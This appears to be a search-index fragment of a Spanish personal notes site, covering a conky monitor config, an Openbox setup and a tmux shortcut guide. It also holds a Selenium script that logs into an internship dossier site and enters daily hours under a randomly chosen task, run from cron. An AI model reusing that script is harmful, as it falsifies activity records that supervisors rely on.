lila [;37]hola color[0m] \u2192 blanco","title":"Cambiar color promp terminal"},{"location":"curiosidades/conky/","text":"conky Conky es un gadget de escritorio donde podemos monitorizar diferentes aspectos de nuestro sistema, con el tenemos una vision rapida del rendimiento del equipo. Este es el conky de ejemplo: El fondo es transparente pero mi tema de escritorio es oscuro, por eso se ve negro. Requisitos para este script: # sensores de temperatura y descarga de datos http sudo apt install -y lm-sensors hddtemp curl # comando velocidad de descarga y subida parecido a \"adsltest\" sudo apt-get install python-pip sudo pip install speedtest-cli Instalar conky sudo apt intall conky conky-all Una vez instalado podemos ver que funciona con. # activar conky -d # matar pkill conky Veremos un script horrible en la izquierda superior del escritorio Script personalizado de conky Manual configuraci\u00f3n oficial Para usar nuestra confiuraci\u00f3n personal la mejor opci\u00f3n es crear un archivo en la siguiente direccion: ~/.conky/test/conkyrc .conky es obligatorio en nla carpeta personal y oculta. test puede ser el nombre que quieras es solo por organizaci\u00f3n. conkyrc es el archivo donde editaremos conky conkyrc # configuracion posicionamiento, fondo y tal background no font Snap.se:size = 8 xftfont Snap.se:size = 8 use_xft yes xftalpha 0 .1 update_interval 3 .0 total_run_times 0 own_window yes own_window_type normal own_window_transparent yes own_window_hints undecorated,below,sticky,skip_taskbar,skip_pager double_buffer yes draw_shades no draw_outline no draw_borders no draw_graph_borders no minimum_size 250 6 maximum_width 400 default_color d9d9d9 #default_shade_color 000000 #default_outline_color 000000 #alignment tr gap_x 1650 gap_y 250 no_buffers yes cpu_avg_samples 2 override_utf8_locale no uppercase no # set to yes if you want all text to be in uppercase use_spacer no own_window_argb_visual yes border_outer_margin 10 TEXT #Aqui empieza la configuracion de los datos que se muestran #El primero es el nombre del sistema operativo y la version del kernel ${ font Ubuntu: style =bold: size =14 }${ execi 3600 lsb_release -d | cut -c14-34 } version $alignr $kernel #Esto nos muestra los cuatro procesadores y una barra de cada uno de ellos con su uso ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Procesadores $hr ${ color d9d9d9 } ${ font Arial: size =11 } CPU1: ${ cpu cpu1 } % ${ cpubar cpu1 } CPU2: ${ cpu cpu2 } % ${ cpubar cpu2 } CPU3: ${ cpu cpu3 } % ${ cpubar cpu3 } CPU4: ${ cpu cpu4 } % ${ cpubar cpu4 } #Esto nos muestra la temperatura de los procesadores ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Temperatura: $hr ${ color d9d9d9 } ${ font Arial: size =11 } Equipo $alignr ${ execi 1 sensors | grep temp1 | cut -c15-17; } C CPU1 ${ alignr }${ execi 1 sensors | grep Core \\ 0 | cut -c15-17; } C CPU2 ${ alignr }${ execi 1 sensors | grep Core \\ 1 | cut -c15-17; } C CPU3 ${ alignr }${ execi 1 sensors | grep Core \\ 2 | cut -c15-17; } C CPU4 ${ alignr }${ execi 1 sensors | grep Core \\ 3 | cut -c15-17; } C #Esto nos muestra la particion Home, la RAM y la sawp con una barra cada una y sus datos ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Memoria y discos $hr ${ color d9d9d9 } ${ font Arial: size =11 } HOME $alignr ${ fs_used /home } / ${ fs_size /home } ${ fs_bar /home } ${ font Arial: size =11 } RAM $alignr $mem / $memmax ${ membar } ${ font Arial: size =11 } SWAP $alignr $swap / $swapmax $swapbar #Esto nos muestra las ip local y publica ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Redes $hr ${ color d9d9d9 } ${ font Arial: size =11 } Ip local ${ alignr } ${ execi 300 ip a | grep inet | grep brd | cut -c10-25 | head -1 } ${ font Arial: size =11 } Ip publica ${ alignr } ${ execi 300 GET http://www.vermiip.es/ | grep \"Tu IP p&uacute;blica es\" | cut -d ':' -f2 | cut -d '<' -f1 } #Esto nos muestra la velocidad de descarga ${ font Arial: size =11 } V red Descarga $alignr ${ execi 300 speedtest-cli | grep Download | cut -c10-15; } Mb/s # cada if muestra los bits que descarga al momento cada red ${ if_up wlxb8a38692198f } ${ font Arial: size =11 } Intensidad WIFI $alignr ${ wireless_link_qual wlxb8a38692198f } % ${ font Arial: size =11 } Descarga wifi $alignr ${ downspeed wlxb8a38692198f } /s ${ endif } ${ if_up enp3s0 }${ font Arial: size =11 } Descarga cable $alignr ${ downspeed enp3s0 } /s ${ endif } #Esto muestra el uso de la CPU de las aplicaciones que mas hacen uso de ella ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Uso CPU aplicaciones $hr ${ color d9d9d9 } ${ font Arial: size =11 }${ top name 1 } $alignr ${ top cpu 1 } % ${ top name 2 } $alignr ${ top cpu 2 } % ${ top name 3 } $alignr ${ top cpu 3 } % #Esto nos muestra el procentaje de RAM que usan las aplicaciones de ella ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Uso RAM aplicaciones $hr ${ color d9d9d9 } ${ font Arial: size =11 }${ top_mem name 1 } $alignr ${ top_mem mem 1 } % ${ top_mem name 2 } $alignr ${ top_mem mem 2 } % ${ top_mem name 3 } $alignr ${ top_mem mem 3 } % Nota: Para que funcione correctamente el apartado de redes se tiene que indicar el nombre red Lanzamos nuestro conky con: conky -c /home/debian/.conky/test/conkyrc En el caso de querer lanzar varios conkys conky -q -c /home/debian/.conky/test/conkyrc conky -q -c /home/debian/.conky/test/conkyrc1 Lanzar conky al inicio de sesi\u00f3n Hay diferentes maneras de lanzar conky al inicio de sesi\u00f3n, usando cron, localrc, o como aplicaci\u00f3n de inicio, que al parecer es lo que prefiere la gente. Iremos al metodo popular. Como estamos usando gnome, este comando abrira una ventana para crear una aplicaci\u00f3n en ~/.config/autostart/ que es la ruta de autoarranque al iniciar la sesi\u00f3n. gnome-desktop-item-edit ~/.config/autostart/ --create-new le indicamos que es una aplicacion nombre comando que queremos que ejecute sh -c \"conky -c /home/debian/.conky/test/conkyrc;\" y si queremos un comentario. Resultado final","title":"conky"},{"location":"curiosidades/conky/#conky","text":"Conky es un gadget de escritorio donde podemos monitorizar diferentes aspectos de nuestro sistema, con el tenemos una vision rapida del rendimiento del equipo. Este es el conky de ejemplo: El fondo es transparente pero mi tema de escritorio es oscuro, por eso se ve negro.","title":"conky"},{"location":"curiosidades/conky/#requisitos-para-este-script","text":"# sensores de temperatura y descarga de datos http sudo apt install -y lm-sensors hddtemp curl # comando velocidad de descarga y subida parecido a \"adsltest\" sudo apt-get install python-pip sudo pip install speedtest-cli","title":"Requisitos para este script:"},{"location":"curiosidades/conky/#instalar-conky","text":"sudo apt intall conky conky-all Una vez instalado podemos ver que funciona con. # activar conky -d # matar pkill conky Veremos un script horrible en la izquierda superior del escritorio","title":"Instalar conky"},{"location":"curiosidades/conky/#script-personalizado-de-conky","text":"Manual configuraci\u00f3n oficial Para usar nuestra confiuraci\u00f3n personal la mejor opci\u00f3n es crear un archivo en la siguiente direccion: ~/.conky/test/conkyrc .conky es obligatorio en nla carpeta personal y oculta. test puede ser el nombre que quieras es solo por organizaci\u00f3n. conkyrc es el archivo donde editaremos conky conkyrc # configuracion posicionamiento, fondo y tal background no font Snap.se:size = 8 xftfont Snap.se:size = 8 use_xft yes xftalpha 0 .1 update_interval 3 .0 total_run_times 0 own_window yes own_window_type normal own_window_transparent yes own_window_hints undecorated,below,sticky,skip_taskbar,skip_pager double_buffer yes draw_shades no draw_outline no draw_borders no draw_graph_borders no minimum_size 250 6 maximum_width 400 default_color d9d9d9 #default_shade_color 000000 #default_outline_color 000000 #alignment tr gap_x 1650 gap_y 250 no_buffers yes cpu_avg_samples 2 override_utf8_locale no uppercase no # set to yes if you want all text to be in uppercase use_spacer no own_window_argb_visual yes border_outer_margin 10 TEXT #Aqui empieza la configuracion de los datos que se muestran #El primero es el nombre del sistema operativo y la version del kernel ${ font Ubuntu: style =bold: size =14 }${ execi 3600 lsb_release -d | cut -c14-34 } version $alignr $kernel #Esto nos muestra los cuatro procesadores y una barra de cada uno de ellos con su uso ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Procesadores $hr ${ color d9d9d9 } ${ font Arial: size =11 } CPU1: ${ cpu cpu1 } % ${ cpubar cpu1 } CPU2: ${ cpu cpu2 } % ${ cpubar cpu2 } CPU3: ${ cpu cpu3 } % ${ cpubar cpu3 } CPU4: ${ cpu cpu4 } % ${ cpubar cpu4 } #Esto nos muestra la temperatura de los procesadores ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Temperatura: $hr ${ color d9d9d9 } ${ font Arial: size =11 } Equipo $alignr ${ execi 1 sensors | grep temp1 | cut -c15-17; } C CPU1 ${ alignr }${ execi 1 sensors | grep Core \\ 0 | cut -c15-17; } C CPU2 ${ alignr }${ execi 1 sensors | grep Core \\ 1 | cut -c15-17; } C CPU3 ${ alignr }${ execi 1 sensors | grep Core \\ 2 | cut -c15-17; } C CPU4 ${ alignr }${ execi 1 sensors | grep Core \\ 3 | cut -c15-17; } C #Esto nos muestra la particion Home, la RAM y la sawp con una barra cada una y sus datos ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Memoria y discos $hr ${ color d9d9d9 } ${ font Arial: size =11 } HOME $alignr ${ fs_used /home } / ${ fs_size /home } ${ fs_bar /home } ${ font Arial: size =11 } RAM $alignr $mem / $memmax ${ membar } ${ font Arial: size =11 } SWAP $alignr $swap / $swapmax $swapbar #Esto nos muestra las ip local y publica ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Redes $hr ${ color d9d9d9 } ${ font Arial: size =11 } Ip local ${ alignr } ${ execi 300 ip a | grep inet | grep brd | cut -c10-25 | head -1 } ${ font Arial: size =11 } Ip publica ${ alignr } ${ execi 300 GET http://www.vermiip.es/ | grep \"Tu IP p&uacute;blica es\" | cut -d ':' -f2 | cut -d '<' -f1 } #Esto nos muestra la velocidad de descarga ${ font Arial: size =11 } V red Descarga $alignr ${ execi 300 speedtest-cli | grep Download | cut -c10-15; } Mb/s # cada if muestra los bits que descarga al momento cada red ${ if_up wlxb8a38692198f } ${ font Arial: size =11 } Intensidad WIFI $alignr ${ wireless_link_qual wlxb8a38692198f } % ${ font Arial: size =11 } Descarga wifi $alignr ${ downspeed wlxb8a38692198f } /s ${ endif } ${ if_up enp3s0 }${ font Arial: size =11 } Descarga cable $alignr ${ downspeed enp3s0 } /s ${ endif } #Esto muestra el uso de la CPU de las aplicaciones que mas hacen uso de ella ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Uso CPU aplicaciones $hr ${ color d9d9d9 } ${ font Arial: size =11 }${ top name 1 } $alignr ${ top cpu 1 } % ${ top name 2 } $alignr ${ top cpu 2 } % ${ top name 3 } $alignr ${ top cpu 3 } % #Esto nos muestra el procentaje de RAM que usan las aplicaciones de ella ${ color 1889ca }${ font Ubuntu: style =bold: size =14 } Uso RAM aplicaciones $hr ${ color d9d9d9 } ${ font Arial: size =11 }${ top_mem name 1 } $alignr ${ top_mem mem 1 } % ${ top_mem name 2 } $alignr ${ top_mem mem 2 } % ${ top_mem name 3 } $alignr ${ top_mem mem 3 } % Nota: Para que funcione correctamente el apartado de redes se tiene que indicar el nombre red","title":"Script personalizado de conky"},{"location":"curiosidades/conky/#lanzamos-nuestro-conky-con","text":"conky -c /home/debian/.conky/test/conkyrc En el caso de querer lanzar varios conkys conky -q -c /home/debian/.conky/test/conkyrc conky -q -c /home/debian/.conky/test/conkyrc1","title":"Lanzamos nuestro conky con:"},{"location":"curiosidades/conky/#lanzar-conky-al-inicio-de-sesion","text":"Hay diferentes maneras de lanzar conky al inicio de sesi\u00f3n, usando cron, localrc, o como aplicaci\u00f3n de inicio, que al parecer es lo que prefiere la gente. Iremos al metodo popular. Como estamos usando gnome, este comando abrira una ventana para crear una aplicaci\u00f3n en ~/.config/autostart/ que es la ruta de autoarranque al iniciar la sesi\u00f3n. gnome-desktop-item-edit ~/.config/autostart/ --create-new le indicamos que es una aplicacion nombre comando que queremos que ejecute sh -c \"conky -c /home/debian/.conky/test/conkyrc;\" y si queremos un comentario.","title":"Lanzar conky al inicio de sesi\u00f3n"},{"location":"curiosidades/conky/#resultado-final","text":"","title":"Resultado final"},{"location":"curiosidades/openbox/","text":"Openbox Openbox es un escritorio muy ligero y \u00fatil en m\u00e1quinas con pocos recursos. Reci\u00e9n instalado solo es un fondo de pantalla oscuro y un men\u00fa con click derecho, por lo tanto tedioso de utilizar y feo, por eso mismo con una configuraci\u00f3n inicial se puede dejar decente. Los paquetes de este documento son de Fedora 30 en otras distribuciones pueden cambiar los nombres. sudo dnf install openbox obconf obmenu lxappearance nitrogen xcompmgr lxrand tint2 xscreensaver volumeicon ulauncher xdotool # descargar ultima versi\u00f3n y descomprimir https://code.google.com/p/obkey/downloads/list tar -zxvf obkey* # mover a /opt y a\u00f1adir binario a /usr/bin mv obkey* /opt rm obkey*tar.gz ln -s /opt/obkey*/obkey /usr/bin # indicar donde guardar cambios obkey /home/USUARIO/.config/openbox/rc.xml Explicaci\u00f3n de lo que se esta instalando: obconf Configuraci\u00f3n openbox obmenu Edici\u00f3n men\u00fa openbox tint2 panel lxappearance Configuraci\u00f3n tema nitrogen Fondo de escritorio xcompmgr Permitir transparencias lxrandr Configuraci\u00f3n monitores ulauncher Lanzador de aplicaciones interactivo (Dock) Este dock es un poco pesado pero hay que decir que mola un monton, para opciones mas ligeras wbar obkey Editor de atajos volumeicon icono de volumen xscreensaver Bloqueo de pantalla xdotool ejecutar atajos de teclado desde terminal Las configuraciones de atajos de teclado permitidas por openbox. http://openbox.org/wiki/Help:Actions Para empezar crearemos un archivo si no existe en ~/.config/openbox/autostart y a\u00f1adimos las caracter\u00edsticas a arrancar al iniciar sesi\u00f3n. autostart # permitir fondo de escritorio nitrogen --restore & # panel tint2 & # permitir transparencia y una pequ\u00f1a animaci\u00f3n de abrir/cerrar ventana xcompmgr -cCfF -t-3 -l-5 -r5 -D4 & # lanzador de aplicaciones molon ulauncher & # bloqueador de pantalla xscreensaver & Personalmente ir clicando el bot\u00f3n derecho para abrir el men\u00fa, me toca la moral. Por lo tanto creo una atajo de teclado y lo asigno a un bot\u00f3n del panel. <keybind key= \"W-Escape\" > <action name= \"ShowMenu\" > <menu> root-menu </menu> </action> </keybind> Abro configuraci\u00f3n del panel con tint2conf creo un bot\u00f3n que es muy intuitivo y en la casilla de ejecutar inserto xdotool key super+Escape . Ahora solo queda configurar todo con un poco de paciencia y al gusto de cada uno, como resultado muestro mis archivos de configuraci\u00f3n. Configuraci\u00f3n personal","title":"Openbox"},{"location":"curiosidades/openbox/#openbox","text":"Openbox es un escritorio muy ligero y \u00fatil en m\u00e1quinas con pocos recursos. Reci\u00e9n instalado solo es un fondo de pantalla oscuro y un men\u00fa con click derecho, por lo tanto tedioso de utilizar y feo, por eso mismo con una configuraci\u00f3n inicial se puede dejar decente. Los paquetes de este documento son de Fedora 30 en otras distribuciones pueden cambiar los nombres. sudo dnf install openbox obconf obmenu lxappearance nitrogen xcompmgr lxrand tint2 xscreensaver volumeicon ulauncher xdotool # descargar ultima versi\u00f3n y descomprimir https://code.google.com/p/obkey/downloads/list tar -zxvf obkey* # mover a /opt y a\u00f1adir binario a /usr/bin mv obkey* /opt rm obkey*tar.gz ln -s /opt/obkey*/obkey /usr/bin # indicar donde guardar cambios obkey /home/USUARIO/.config/openbox/rc.xml Explicaci\u00f3n de lo que se esta instalando: obconf Configuraci\u00f3n openbox obmenu Edici\u00f3n men\u00fa openbox tint2 panel lxappearance Configuraci\u00f3n tema nitrogen Fondo de escritorio xcompmgr Permitir transparencias lxrandr Configuraci\u00f3n monitores ulauncher Lanzador de aplicaciones interactivo (Dock) Este dock es un poco pesado pero hay que decir que mola un monton, para opciones mas ligeras wbar obkey Editor de atajos volumeicon icono de volumen xscreensaver Bloqueo de pantalla xdotool ejecutar atajos de teclado desde terminal Las configuraciones de atajos de teclado permitidas por openbox. http://openbox.org/wiki/Help:Actions Para empezar crearemos un archivo si no existe en ~/.config/openbox/autostart y a\u00f1adimos las caracter\u00edsticas a arrancar al iniciar sesi\u00f3n. autostart # permitir fondo de escritorio nitrogen --restore & # panel tint2 & # permitir transparencia y una pequ\u00f1a animaci\u00f3n de abrir/cerrar ventana xcompmgr -cCfF -t-3 -l-5 -r5 -D4 & # lanzador de aplicaciones molon ulauncher & # bloqueador de pantalla xscreensaver & Personalmente ir clicando el bot\u00f3n derecho para abrir el men\u00fa, me toca la moral. Por lo tanto creo una atajo de teclado y lo asigno a un bot\u00f3n del panel. <keybind key= \"W-Escape\" > <action name= \"ShowMenu\" > <menu> root-menu </menu> </action> </keybind> Abro configuraci\u00f3n del panel con tint2conf creo un bot\u00f3n que es muy intuitivo y en la casilla de ejecutar inserto xdotool key super+Escape . Ahora solo queda configurar todo con un poco de paciencia y al gusto de cada uno, como resultado muestro mis archivos de configuraci\u00f3n. Configuraci\u00f3n personal","title":"Openbox"},{"location":"curiosidades/qbit/","text":"Qbit los siguientes scripts tienen la funcionalidad de rellenar las horas del qbit. Si se inserta una linea en el cron indicando que se ejecute diariamente, solo se tendra que rellenar las valoraciones finales respectivas a cada mes. Ejemplo de ejecutar script: python qbit.py 4.0 Chrome Dependencias necesarias para Chrome sudo dnf/apt install chromedriver sudo dnf/apt install python-selenium sudo pip install -U selenium qbit.py #!/usr/bin/env python3 # -*- coding: utf-8 -*- # example: python qbit.py 4.0 # Imports from selenium import webdriver from selenium.webdriver.common.keys import Keys from time import sleep from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support.ui import Select from selenium.webdriver.common.by import By from selenium.common.exceptions import TimeoutException from selenium.common.exceptions import NoSuchElementException import random import sys hours = str ( sys.argv [ 1 ]) task = [ 'inp_8217' , 'inp_8218' , 'inp_8220' , 'inp_8221' , 'inp_8222' , 'inp_8224' , 'inp_8225' , 'inp_8227' , 'inp_8228' , 'inp_8229' , 'inp_8231' , 'inp_8232' ] username = \"username\" password = \"pasword\" ###### version headles ########### options = webdriver.ChromeOptions () options.add_argument ( 'headless' ) driver = webdriver.Chrome ( chrome_options = options ) ###################### #driver = webdriver.Chrome() driver.get ( \"https://www.empresaiformacio.org/sBidAlumne\" ) driver.switch_to.frame ( 1 ) username_input = driver.find_element_by_id ( \"username\" ) password_input = driver.find_element_by_id ( \"password\" ) username_input.send_keys ( username ) password_input.send_keys ( password ) password_input.send_keys ( Keys.RETURN ) sleep ( 4 ) driver.switch_to.frame ( 12 ) driver.find_element_by_link_text ( u \"Activitat di\u00e0ria del dossier (2017195338)\" ) .click () sleep ( 3 ) ################# valueDefaultTask = \"0\" for itemTask in task: Select ( driver.find_element_by_id ( itemTask )) .select_by_value ( valueDefaultTask ) ############## Select ( driver.find_element_by_id ( random.choice ( task ))) .select_by_value ( hours ) driver.find_element_by_xpath ( u \"//img[@title='Emmagatzemar activitat di\u00e0ria']\" ) .click () driver.close () Firefox Dependencias necesarias para firefox sudo dnf/apt install chromedriver sudo dnf/apt install python-selenium sudo pip install -U selenium # download geckodriver wget https://github.com/mozilla/geckodriver/releases sudo mv geckodriver /usr/local/bin qbit.py #!/usr/bin/env python3 # -*- coding: utf-8 -*- # sudo dnf/apt install chromedriver # sudo dnf/apt install python-selenium # sudo pip install -U selenium # download geckodriver # https://github.com/mozilla/geckodriver/releases # sudo mv geckodriver /usr/local/bin # example: python qbit.py 4.0 # Imports from selenium import webdriver from selenium.webdriver.common.keys import Keys from time import sleep from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support.ui import Select from selenium.webdriver.common.by import By from selenium.common.exceptions import TimeoutException from selenium.common.exceptions import NoSuchElementException import random import sys hours = str ( sys.argv [ 1 ]) task = [ 'inp_8217' , 'inp_8218' , 'inp_8220' , 'inp_8221' , 'inp_8222' , 'inp_8224' , 'inp_8225' , 'inp_8227' , 'inp_8228' , 'inp_8229' , 'inp_8231' , 'inp_8232' ] username = \"username\" password = \"pasword\" ###### version headles ########### options = webdriver.FirefoxOptions () options.add_argument ( '--headless' ) driver = webdriver.Firefox ( firefox_options = options ) ###################### #driver = webdriver.Firefox() driver.get ( \"https://www.empresaiformacio.org/sBidAlumne\" ) driver.switch_to.frame ( 1 ) username_input = driver.find_element_by_id ( \"username\" ) password_input = driver.find_element_by_id ( \"password\" ) username_input.send_keys ( username ) password_input.send_keys ( password ) password_input.send_keys ( Keys.RETURN ) sleep ( 4 ) driver.switch_to.frame ( 12 ) driver.find_element_by_link_text ( u \"Activitat di\u00e0ria del dossier (2017195338)\" ) .click () sleep ( 3 ) ################# valueDefaultTask = \"0\" for itemTask in task: Select ( driver.find_element_by_id ( itemTask )) .select_by_value ( valueDefaultTask ) ############## Select ( driver.find_element_by_id ( random.choice ( task ))) .select_by_value ( hours ) driver.find_element_by_xpath ( u \"//img[@title='Emmagatzemar activitat di\u00e0ria']\" ) .click () driver.close ()","title":"Qbit"},{"location":"curiosidades/qbit/#qbit","text":"los siguientes scripts tienen la funcionalidad de rellenar las horas del qbit. Si se inserta una linea en el cron indicando que se ejecute diariamente, solo se tendra que rellenar las valoraciones finales respectivas a cada mes. Ejemplo de ejecutar script: python qbit.py 4.0","title":"Qbit"},{"location":"curiosidades/qbit/#chrome","text":"Dependencias necesarias para Chrome sudo dnf/apt install chromedriver sudo dnf/apt install python-selenium sudo pip install -U selenium qbit.py #!/usr/bin/env python3 # -*- coding: utf-8 -*- # example: python qbit.py 4.0 # Imports from selenium import webdriver from selenium.webdriver.common.keys import Keys from time import sleep from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support.ui import Select from selenium.webdriver.common.by import By from selenium.common.exceptions import TimeoutException from selenium.common.exceptions import NoSuchElementException import random import sys hours = str ( sys.argv [ 1 ]) task = [ 'inp_8217' , 'inp_8218' , 'inp_8220' , 'inp_8221' , 'inp_8222' , 'inp_8224' , 'inp_8225' , 'inp_8227' , 'inp_8228' , 'inp_8229' , 'inp_8231' , 'inp_8232' ] username = \"username\" password = \"pasword\" ###### version headles ########### options = webdriver.ChromeOptions () options.add_argument ( 'headless' ) driver = webdriver.Chrome ( chrome_options = options ) ###################### #driver = webdriver.Chrome() driver.get ( \"https://www.empresaiformacio.org/sBidAlumne\" ) driver.switch_to.frame ( 1 ) username_input = driver.find_element_by_id ( \"username\" ) password_input = driver.find_element_by_id ( \"password\" ) username_input.send_keys ( username ) password_input.send_keys ( password ) password_input.send_keys ( Keys.RETURN ) sleep ( 4 ) driver.switch_to.frame ( 12 ) driver.find_element_by_link_text ( u \"Activitat di\u00e0ria del dossier (2017195338)\" ) .click () sleep ( 3 ) ################# valueDefaultTask = \"0\" for itemTask in task: Select ( driver.find_element_by_id ( itemTask )) .select_by_value ( valueDefaultTask ) ############## Select ( driver.find_element_by_id ( random.choice ( task ))) .select_by_value ( hours ) driver.find_element_by_xpath ( u \"//img[@title='Emmagatzemar activitat di\u00e0ria']\" ) .click () driver.close ()","title":"Chrome"},{"location":"curiosidades/qbit/#firefox","text":"Dependencias necesarias para firefox sudo dnf/apt install chromedriver sudo dnf/apt install python-selenium sudo pip install -U selenium # download geckodriver wget https://github.com/mozilla/geckodriver/releases sudo mv geckodriver /usr/local/bin qbit.py #!/usr/bin/env python3 # -*- coding: utf-8 -*- # sudo dnf/apt install chromedriver # sudo dnf/apt install python-selenium # sudo pip install -U selenium # download geckodriver # https://github.com/mozilla/geckodriver/releases # sudo mv geckodriver /usr/local/bin # example: python qbit.py 4.0 # Imports from selenium import webdriver from selenium.webdriver.common.keys import Keys from time import sleep from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support.ui import Select from selenium.webdriver.common.by import By from selenium.common.exceptions import TimeoutException from selenium.common.exceptions import NoSuchElementException import random import sys hours = str ( sys.argv [ 1 ]) task = [ 'inp_8217' , 'inp_8218' , 'inp_8220' , 'inp_8221' , 'inp_8222' , 'inp_8224' , 'inp_8225' , 'inp_8227' , 'inp_8228' , 'inp_8229' , 'inp_8231' , 'inp_8232' ] username = \"username\" password = \"pasword\" ###### version headles ########### options = webdriver.FirefoxOptions () options.add_argument ( '--headless' ) driver = webdriver.Firefox ( firefox_options = options ) ###################### #driver = webdriver.Firefox() driver.get ( \"https://www.empresaiformacio.org/sBidAlumne\" ) driver.switch_to.frame ( 1 ) username_input = driver.find_element_by_id ( \"username\" ) password_input = driver.find_element_by_id ( \"password\" ) username_input.send_keys ( username ) password_input.send_keys ( password ) password_input.send_keys ( Keys.RETURN ) sleep ( 4 ) driver.switch_to.frame ( 12 ) driver.find_element_by_link_text ( u \"Activitat di\u00e0ria del dossier (2017195338)\" ) .click () sleep ( 3 ) ################# valueDefaultTask = \"0\" for itemTask in task: Select ( driver.find_element_by_id ( itemTask )) .select_by_value ( valueDefaultTask ) ############## Select ( driver.find_element_by_id ( random.choice ( task ))) .select_by_value ( hours ) driver.find_element_by_xpath ( u \"//img[@title='Emmagatzemar activitat di\u00e0ria']\" ) .click () driver.close ()","title":"Firefox"},{"location":"curiosidades/tmux/","text":"Tmux Esteroides para tu terminal Hoy, quiero presentaros a tmux, un programa que dotar\u00e1 de funciones extra a cualquier emulador de terminal que estemos usando . Estas funciones incluyen entre otras, pesta\u00f1as, paneles, poder administrar diferentes sesiones en una misma ventana, trabajo cooperativo v\u00eda SSH\u2026 Vamos, que es como darle superpoderes a nuestra amiguita. link pag\u00edna donde se extrajo la info manual tmux Explicare los atajos m\u00e1s usados, pero sin duda el m\u00e1s importante es el siguiente, la ayuda. Menu ayuda ctrl + ? # muestra todos los atajos disponibles Abrir sesion en tmux tmux # nombre aleatorio tmux new -s mysesion # nombre espec\u00edfico Dividir pantalla ctrl + b % # panel vertical ctrl + b \" # panel horizontal Moverse entre divisiones ctrl + b # flecha de direcci\u00f3n Nueva ventana ctrl + b c Navegar entre ventanas ctrl + b n # adelante ctrl + b p # atras Dar nombre a ventana ctrl + b , Redimensionar ventana ctrl + b Esc + direccion de flecha Lo malo que solo mueve 10 espacios por ejecuci\u00f3n, por lo tanto creo un nuevo atajo. vim ~/tmux.conf bind-key -r S-Up resize-pane -U 10 bind-key -r S-Down resize-pane -D 10 bind-key -r S-Left resize-pane -L 10 bind-key -r S-Right resize-pane -R 10 - -r permite repetir la ejecuci\u00f3n de la tecla. ahora con ctrl + b shift + {left,right,up,down} podremos redimensionar al gusto. Zoom de una ventana ctrl + b z # a\u00f1adir zoom, pone pantalla completa ctrl + b z # por segunda vez, quitar zoom Cerrar ventana ctrl + b & ctrl + b x # cerrar divisi\u00f3n o ventana si no hay divisiones Tarea en 2\u00ba plano Muy \u00fatil cuando ejecutas un comando que tarda mucho. ctrl + b d Ver listas de sesiones activas tmux ls Volver a la sesi\u00f3n tmux a # en el caso de que ayan varias sesiones activas tmux a -t nombre Elegir sesi\u00f3n si tenemos abierta m\u00e1s de una. Ctrl + b s Cerrar sesion ctrl + b & # en todas las ventanas tmux kill-session -t mysesi\u00f3n # matar sesi\u00f3n Copiar y pegar En tmux se puede copiar y pegar como en todas las terminales ctrl + Mayus + c|v , o en caso de no utilizar entorno gr\u00e1fico dispone de su propio Copy&Paste muy parecido a vim. Entrar \"copy mode\" presionando CTRL + b, [ . Utilizar las flechas para mover el cursor por la pantalla. Presiona CTRL + SPACE para empezar a copiar. Usa las flexas para moverte al final det texto que quieres copiar. Presiona ALT + w o CTRL + w para copiar. Presiona CTRL + b, ] para copiar, incluso en otras ventanas Tmux abiertas en esa misma sessi\u00f3n. Compartir sesi\u00f3n Partimos de 2 hosts, host \"uno\" y host \"dos\", el host dos ara de server con la ip 10.0.0.2. Fingiremos que hay alguien trabajando en el server e invita a otro a ver su trabajo, o pide ayuda, da lo mismo. Server, host dos. inicia tmux con una sesion llamada compartida tmux new -s compartida ###### Host \"uno\" conecta con server tmux # inicia sesion de tmux ssh server@10.0.0.2 # se conecta via ssh al server tmux ls # lista sesiones abiertas tmux a -t compartida # se conecta a la sesi\u00f3n compartida","title":"Tmux"},{"location":"curiosidades/tmux/#tmux","text":"","title":"Tmux"},{"location":"curiosidades/tmux/#esteroides-para-tu-terminal","text":"Hoy, quiero presentaros a tmux, un programa que dotar\u00e1 de funciones extra a cualquier emulador de terminal que estemos usando . Estas funciones incluyen entre otras, pesta\u00f1as, paneles, poder administrar diferentes sesiones en una misma ventana, trabajo cooperativo v\u00eda SSH\u2026 Vamos, que es como darle superpoderes a nuestra amiguita. link pag\u00edna donde se extrajo la info manual tmux Explicare los atajos m\u00e1s usados, pero sin duda el m\u00e1s importante es el siguiente, la ayuda.","title":"Esteroides para tu terminal"},{"location":"curiosidades/tmux/#menu-ayuda","text":"ctrl + ? # muestra todos los atajos disponibles","title":"Menu ayuda"},{"location":"curiosidades/tmux/#abrir-sesion-en-tmux","text":"tmux # nombre aleatorio tmux new -s mysesion # nombre espec\u00edfico","title":"Abrir sesion en tmux"},{"location":"curiosidades/tmux/#dividir-pantalla","text":"ctrl + b % # panel vertical ctrl + b \" # panel horizontal","title":"Dividir pantalla"},{"location":"curiosidades/tmux/#moverse-entre-divisiones","text":"ctrl + b # flecha de direcci\u00f3n","title":"Moverse entre divisiones"},{"location":"curiosidades/tmux/#nueva-ventana","text":"ctrl + b c","title":"Nueva ventana"},{"location":"curiosidades/tmux/#navegar-entre-ventanas","text":"ctrl + b n # adelante ctrl + b p # atras","title":"Navegar entre ventanas"},{"location":"curiosidades/tmux/#dar-nombre-a-ventana","text":"ctrl + b ,","title":"Dar nombre a ventana"},{"location":"curiosidades/tmux/#redimensionar-ventana","text":"ctrl + b Esc + direccion de flecha Lo malo que solo mueve 10 espacios por ejecuci\u00f3n, por lo tanto creo un nuevo atajo. vim ~/tmux.conf bind-key -r S-Up resize-pane -U 10 bind-key -r S-Down resize-pane -D 10 bind-key -r S-Left resize-pane -L 10 bind-key -r S-Right resize-pane -R 10 - -r permite repetir la ejecuci\u00f3n de la tecla. ahora con ctrl + b shift + {left,right,up,down} podremos redimensionar al gusto.","title":"Redimensionar 